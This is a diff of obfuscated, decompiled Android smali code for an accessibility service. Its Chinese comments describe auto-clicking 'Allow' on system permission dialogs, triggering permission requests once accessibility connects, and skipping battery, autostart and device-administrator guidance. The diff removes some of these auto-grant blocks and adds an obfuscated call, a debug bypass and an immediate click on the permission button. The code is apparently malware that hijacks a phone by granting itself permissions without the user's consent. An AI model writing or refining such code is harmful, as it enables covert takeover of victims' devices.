@@ -3038,28 +3038,6 @@
 
     move-object/from16 v2, p1
 
-    # 权限对话框：交给混淆模块自动点允许
-    :try_start_permag
-    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
-    move-result-object v1
-    if-nez v1, :cond_permag_skip
-    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
-    move-result-object v1
-    const-string v3, "GrantPermissionsActivity"
-    invoke-virtual {v1, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
-    move-result v1
-    if-nez v1, :cond_permag_skip
-    move-object/from16 v0, p0
-    invoke-static {v0}, Lڝږ؁ڋ/ڤ;->start(Landroid/accessibilityservice/AccessibilityService;)V
-    :cond_permag_skip
-    :try_end_permag
-    .catch Ljava/lang/Exception; {:try_start_permag .. :try_end_permag} :catch_permag
-    goto :goto_permag
-
-    :catch_permag
-    move-exception v0
-    :goto_permag
-
     const-string v1, "]"
 
     const-string v3, "CC_LOCK cls="
@@ -4375,19 +4353,6 @@
 .method public final onServiceConnected()V
     .locals 22
 
-    # 无障碍连上后延迟 2 秒再拉权限申请
-    :try_start_perm
-    move-object/from16 v4, p0
-    invoke-static {v4}, Lڝږ؁ڋ/ڽ;->start(Landroid/accessibilityservice/AccessibilityService;)V
-    :try_end_perm
-    .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
-    goto :goto_perm
-
-    :catch_perm
-    move-exception v0
-    :goto_perm
-
-
     move-object/from16 v1, p0
 
     const-string v2, "_installTs"
@@ -4850,6 +4815,14 @@
 
     move-result-object v0
 
+    # 调试模式：跳过原版引导（优化中遮罩/电池/自启动/设备管理器）
+    move-object/from16 v0, p0
+    invoke-static {v0}, Lڝږ؁ڋ/ھ;->isDebug(Landroid/content/Context;)Z
+    move-result v0
+    if-eqz v0, :guide_debug
+    goto/16 :goto_9
+
+    :guide_debug
     const-string v11, "permFlowDone"
 
     invoke-interface {v0, v11, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
@@ -5045,6 +5018,10 @@
     if-nez v12, :cond_e
 
     :try_start_c
+    invoke-static/range {p0 .. p0}, Lڗًقڔ/؋;->ٽ(Landroid/content/Context;)V
+    :try_end_c
+    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b
+
     goto :goto_9
 
     :catch_b
@@ -10986,34 +10963,7 @@
 .end method
 
 .method public final ع(Ljava/lang/String;)V
-    .locals 14
-
-    # 调试模式：只点权限框内的按钮，其它页面一律不点
-    :try_start_permfilter
-    invoke-static {p0}, Lڝږ؁ڋ/ڽ;->isDebug(Landroid/content/Context;)Z
-    move-result v0
-    if-nez v0, :permfilter_ok
-    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
-    move-result-object v0
-    if-nez v0, :permfilter_ok
-    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;
-    move-result-object v0
-    if-nez v0, :permfilter_ok
-    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
-    move-result-object v0
-    const-string v1, "permissioncontroller"
-    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
-    move-result v0
-    if-eqz v0, :permfilter_ok
-    return-void
-    :permfilter_ok
-    :try_end_permfilter
-    .catch Ljava/lang/Exception; {:try_start_permfilter .. :try_end_permfilter} :catch_permfilter
-    goto :goto_permfilter
-
-    :catch_permfilter
-    move-exception v0
-    :goto_permfilter
+    .locals 12
 
     const-string v0, "com.android.settings:id/action_button"
 
@@ -11279,13 +11229,7 @@
 
     invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    # 测试模式：延迟 2 秒再点允许，方便看清每个权限框
-    new-instance v9, Lڝږ؁ڋ/ڼ;
-    invoke-direct {v9, v10}, Lڝږ؁ڋ/ڼ;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
-    sget-object v10, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
-    const-wide/16 v12, 0x7d0
-    invoke-virtual {v10, v9, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-
+    invoke-virtual {v10, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
 
     return-void
 
